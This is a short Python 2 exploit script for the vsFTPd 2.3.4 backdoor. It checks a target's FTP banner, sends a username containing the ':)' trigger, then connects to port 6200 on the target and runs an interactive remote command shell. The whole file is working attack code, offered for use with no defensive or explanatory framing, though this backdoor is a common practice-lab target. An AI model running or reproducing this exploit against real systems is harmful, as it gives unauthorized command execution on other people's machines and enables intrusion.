#/bin/python

from socket import *
import sys

aux = socket(AF_INET,SOCK_STREAM)
host = sys.argv[1]
port = int(sys.argv[2])

# These lines are checking the vulnerability

aux.connect((host,port))
head = aux.recv(1024).strip()
if "(vsFTPd 2.3.4)" in head:
    aux.send("USER something:)\n")
    aux.recv(1024)
    aux.send("PASS againsomething\n")
    aux.close()
    print "My man! This port has got a vull.\n"
else:
    print "Sorry dude:( This is a normal port\n"
    exit()

# These lines are exploiting the vulnerability

exp = socket(AF_INET,SOCK_STREAM)

exp.connect((host,6200))
while True:
    com = raw_input("#")
    
    if com == "exit":
        exp.close()
        exit()

    exp.send(com + "\n")
    data = exp.recv(1024)
    print data
